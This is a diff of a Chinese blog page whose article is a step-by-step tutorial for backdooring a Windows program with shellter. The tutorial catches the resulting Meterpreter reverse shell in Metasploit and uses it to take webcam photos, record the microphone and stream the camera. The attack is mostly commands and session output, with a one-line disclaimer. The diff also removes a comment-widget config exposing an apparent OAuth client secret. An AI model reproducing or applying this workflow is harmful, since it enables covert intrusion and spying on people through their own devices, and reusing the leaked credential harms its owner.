@@ -37,7 +37,8 @@ root@kali:/ho">
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-</head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
 <body>
@@ -424,14 +425,14 @@ root@kali:/ho">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        624
+                        610
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        3 分
+                        2 分
                     </div>
                     
                 
@@ -447,17 +448,17 @@ root@kali:/ho">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>系统：Kali、windows 10 （电脑上带摄像头）</p>
+                <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>系统：Kali、windows 10 （电脑上带摄像头）</p>
 <p>软件：shellter（kali 默认安装）</p>
 <p>注：关闭防火墙和杀毒软件</p>
-<h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><ol>
+<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><ol>
 <li><p>将任意 PE 软件，放到 Kali 系统中</p>
 </li>
 <li><p>运行 shellter</p>
 </li>
 </ol>
-<pre class=" language-bash"><code class="language-bash">root@kali:/home/SHELL<span class="token comment" spellcheck="true"># shellter</span>
-</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">root@kali:/home/SHELL<span class="token comment" spellcheck="true"># shellter</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <ol start="3">
 <li>在 shellter 弹窗中输入 A（Auto，自动添加后门），第二行输入 PE 软件的存放路径</li>
 </ol>
@@ -477,59 +478,59 @@ root@kali:/ho">
 <ol start="7">
 <li>打开 msf，并监听地址和端口</li>
 </ol>
-<pre class=" language-bash"><code class="language-bash">root@kali:/home/SHELL<span class="token comment" spellcheck="true"># msfconsole</span>
+<pre class="line-numbers language-bash"><code class="language-bash">root@kali:/home/SHELL<span class="token comment" spellcheck="true"># msfconsole</span>
 
-msf5 <span class="token operator">&gt;</span> use multi/handler
+msf5 <span class="token operator">></span> use multi/handler
 
-msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp
+msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp
 
-payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/meterpreter/reverse_tcp
+payload <span class="token operator">=</span><span class="token operator">></span> windows/meterpreter/reverse_tcp
 
-msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> LHOST 192.168.124.26
+msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LHOST 192.168.124.26
 
-LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> 192.168.124.26
+LHOST <span class="token operator">=</span><span class="token operator">></span> 192.168.124.26
 
-msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> LPORT 4444
+msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LPORT 4444
 
-LPORT <span class="token operator">=</span><span class="token operator">&gt;</span> 4444
+LPORT <span class="token operator">=</span><span class="token operator">></span> 4444
 
-msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</code></pre>
+msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ol start="8">
 <li><p>将添加好后门的 PE 软件，放到 windows 10 系统中并运行。 </p>
 </li>
 <li><p>msf 监听到了会话，并进行摄像头操作</p>
 </li>
 </ol>
-<pre class=" language-bash"><code class="language-bash">// ** 将添加了后门的软件，放到 windwos 中，并运行.出现如下内容，说明反向shell已经成功 ** //
+<pre class="line-numbers language-bash"><code class="language-bash">// ** 将添加了后门的软件，放到 windwos 中，并运行.出现如下内容，说明反向shell已经成功 ** //
 
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.168.124.26:4444 
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>179779 bytes<span class="token punctuation">)</span> to 192.168.124.25
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>192.168.124.26:4444 -<span class="token operator">&gt;</span> 192.168.124.25:1773<span class="token punctuation">)</span> at 2019-08-23 00:40:53 +0800
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>192.168.124.26:4444 -<span class="token operator">></span> 192.168.124.25:1773<span class="token punctuation">)</span> at 2019-08-23 00:40:53 +0800
 
 // ** 查看摄像头 ** //
 
-meterpreter <span class="token operator">&gt;</span> webcam_list
+meterpreter <span class="token operator">></span> webcam_list
 1: Chicony USB2.0 Camera
 
 // ** 用摄像头进行拍照 ** //
 
-meterpreter <span class="token operator">&gt;</span> webcam_snap -i 1
+meterpreter <span class="token operator">></span> webcam_snap -i 1
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting<span class="token punctuation">..</span>.
 <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Got frame
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopped
 Webcam shot saved to: /root/sUqFcfWF.jpeg
-meterpreter <span class="token operator">&gt;</span> gimp_device_info_set_device: trying to <span class="token keyword">set</span> GdkDevice <span class="token string">'VirtualPS/2 VMware VMMouse'</span> on GimpDeviceInfo <span class="token function">which</span> already has a device
+meterpreter <span class="token operator">></span> gimp_device_info_set_device: trying to <span class="token keyword">set</span> GdkDevice <span class="token string">'VirtualPS/2 VMware VMMouse'</span> on GimpDeviceInfo <span class="token function">which</span> already has a device
 
 // ** 录制声音 ** //
 
-meterpreter <span class="token operator">&gt;</span>  record_mic
+meterpreter <span class="token operator">></span>  record_mic
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting<span class="token punctuation">..</span>.
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopped
 Audio saved to: /root/fSAEXVSs.wav
 
 // ** 开启摄像头（在 /var/www//webcam.htm 中可以看到截取的图片） ** //
 
-meterpreter <span class="token operator">&gt;</span> run webcam -p /var/www/
+meterpreter <span class="token operator">></span> run webcam -p /var/www/
 
 <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/windows/manage/webcam.
 <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/windows/manage/webcam OPTION<span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
@@ -541,9 +542,9 @@ meterpreter <span class="token operator">&gt;</span> run webcam -p /var/www/
 
 // ** 关闭摄像头 ** //
 
-run webcam -s</code></pre>
+run webcam -s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong></strong></p><center><strong>不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。</strong></center><p></p>
-<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.freebuf.com/articles/system/209261.html" target="_blank" rel="noopener">使用反向Shell控制摄像头</a></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.freebuf.com/articles/system/209261.html" target="_blank" rel="noopener">使用反向Shell控制摄像头</a></p>
 <p><a href="https://www.cnblogs.com/Sunben/p/10574924.html" target="_blank" rel="noopener">meterpreter后渗透之摄像头和录音详细用法</a></p>
 <p><a href="https://bbs.ichunqiu.com/thread-25177-1-1.html" target="_blank" rel="noopener">屌丝绅士-后门捆绑工具-shellter</a></p>
 <script>
@@ -596,28 +597,6 @@ run webcam -s</code></pre>
     
 
     
-        <link rel="stylesheet" href="/libs/gitment/gitment-default.css">
-<link rel="stylesheet" href="/css/gitment.css">
-
-<div class="gitment-card card" data-aos="fade-up">
-    <div id="gitment-content" class="card-content"></div>
-</div>
-
-<script src="/libs/gitment/gitment.js"></script>
-<script>
-var gitment = new Gitment({
-    id: 'Thu Aug 22 2019 17:11:07 GMT+0800',
-    owner: '315053891',
-    repo: 'hhkk2334.github.io',
-    oauth: {
-        client_id: '2ba8ba1b984aa89bf7cf',
-        client_secret: 'eb1541997c7ddce00df527e897e7419e105f6b04'
-    }
-});
-
-gitment.render('gitment-content');
-</script>
-    
 
     
 
@@ -645,8 +624,8 @@ gitment.render('gitment-content');
                 </a>
                 <div class="card-content article-content">
                     <div class="summary">/
-├── bin -&gt; usr/bin                  //存放系统管理员及普通用户使用的命令和可执行的二进制文件
-├── boot                            //存放启动 linux </div>
+├── bin -> usr/bin                  //存放系统管理员及普通用户使用的命令和可执行的二进制文件
+├── boot                            //存放启动 linux 时使用</div>
                     <div class="publish-info">
                         <span class="publish-date">
                             <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-24
@@ -923,5 +902,6 @@ scheme: Pisces
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
 
 
+<script src="/live2d-widget/autoload.js"></script>
 </body>
 </html>
